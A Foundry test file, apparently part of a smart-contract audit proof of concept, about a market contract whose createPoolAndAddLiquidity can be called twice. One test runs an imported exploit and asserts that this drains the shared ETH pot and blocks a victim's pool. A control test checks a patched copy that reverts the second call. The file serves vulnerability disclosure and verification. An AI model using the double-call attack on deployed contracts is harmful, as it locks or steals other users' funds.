// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./36317-c-01-locking-collected-eth-by-triggering-createpoolandaddliq.sol";

contract SeriousDoubleLiquidityExpTest is Test {
    function test_second_pool_creation_locks_other_tokens_eth() public {
        Exploit e = new Exploit();
        vm.deal(address(e), 20 ether);
        e.run();

        assertTrue(e.attackerPoolCreatedTwice(), "attacker should be able to create their own pool twice");
        assertTrue(e.victimPoolCreationBlocked(), "victim's pool creation must be blocked");
        assertEq(address(e.market()).balance, 0, "shared pot should be fully drained");
    }

    /// @dev Control: with the recommended fix (require tradingEnabled before
    ///      disabling it again), the second call for the attacker's own
    ///      token must revert, leaving the victim's ETH untouched.
    function test_control_fixed_version_blocks_second_call() public {
        vm.deal(address(this), 20 ether);
        MockWETH weth = new MockWETH();
        MockUniswapFactory factory = new MockUniswapFactory();
        MockPositionManager posMgr = new MockPositionManager();
        SeriousMarketProtocolFixed market = new SeriousMarketProtocolFixed(weth, factory, posMgr);
        MockERC20 attackerToken = new MockERC20();
        MockERC20 victimToken = new MockERC20();
        market.createToken(address(attackerToken), attackerToken);
        market.createToken(address(victimToken), victimToken);

        market.buyToken{value: 10 ether}(address(attackerToken), 1_000_000e18);
        market.buyToken{value: 10 ether}(address(victimToken), 1_000_000e18);

        market.createPoolAndAddLiquidity(address(attackerToken));
        attackerToken.mint(address(market), 1_000_000e18);

        vm.expectRevert(bytes("Already disabled"));
        market.createPoolAndAddLiquidity(address(attackerToken));

        // Victim's ETH is untouched and their own pool creation succeeds.
        assertEq(address(market).balance, 10 ether);
        market.createPoolAndAddLiquidity(address(victimToken));
    }
}

/// @dev Standalone patched analog used only by the control test: adds the
///      recommended "already disabled" check.
contract SeriousMarketProtocolFixed {
    uint256 public constant tradeableSupply = 1_000_000e18;
    uint256 public constant ethAmount = 10 ether;
    uint256 public constant tokenAmount = 1_000_000e18;

    MockWETH public weth;
    MockUniswapFactory public uniswapFactory;
    MockPositionManager public positionManager;
    address public constant customNullAddress = address(0xdEaD);

    mapping(address => TokenData) public tokenDatas;

    constructor(MockWETH _weth, MockUniswapFactory _factory, MockPositionManager _posMgr) {
        weth = _weth;
        uniswapFactory = _factory;
        positionManager = _posMgr;
    }

    function createToken(address tokenAddress, MockERC20 token) external {
        tokenDatas[tokenAddress] = TokenData(token, 0, true);
    }

    function buyToken(address tokenAddress, uint256 amount) external payable {
        TokenData storage tokenData = tokenDatas[tokenAddress];
        require(tokenData.tradingEnabled, "Trading not enabled");
        tokenData.tokensSold += amount;
        tokenData.token.mint(msg.sender, amount);
    }

    function createPoolAndAddLiquidity(address tokenAddress) external returns (address) {
        TokenData memory tokenData = tokenDatas[tokenAddress];
        require(address(tokenData.token) != address(0), "Token does not exist");
        require(tokenData.tokensSold >= tradeableSupply, "Not enough tokens sold to create pool");
        require(tokenData.tradingEnabled, "Already disabled"); // FIX applied

        tokenDatas[tokenAddress].tradingEnabled = false;

        weth.deposit{value: ethAmount}();

        address pool = uniswapFactory.getPool(tokenAddress);
        if (pool == address(0)) {
            pool = uniswapFactory.createPool(tokenAddress);
        }

        uint256 tokenId = positionManager.mint(pool, tokenAddress, tokenAmount, ethAmount);
        positionManager.transferFrom(address(this), customNullAddress, tokenId);

        return pool;
    }

    receive() external payable {}
}
